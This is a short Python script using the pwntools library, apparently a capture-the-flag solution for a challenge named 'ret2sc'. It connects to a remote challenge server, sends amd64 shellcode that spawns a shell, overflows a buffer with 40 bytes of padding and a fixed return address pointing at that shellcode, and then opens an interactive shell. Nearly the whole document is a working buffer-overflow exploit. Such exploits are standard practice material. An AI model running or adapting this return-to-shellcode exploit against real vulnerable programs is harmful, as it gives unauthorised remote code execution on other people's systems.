#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['terminator', '-x', 'bash', '-c']

r = remote("pwnhub.tw", 54321)
#r = process('./ret2sc')
r.recv()
r.sendline(asm(shellcraft.amd64.linux.sh()))
r.recv()
r.sendline('a'*40 + p64(0x0000000000601080))
r.interactive()
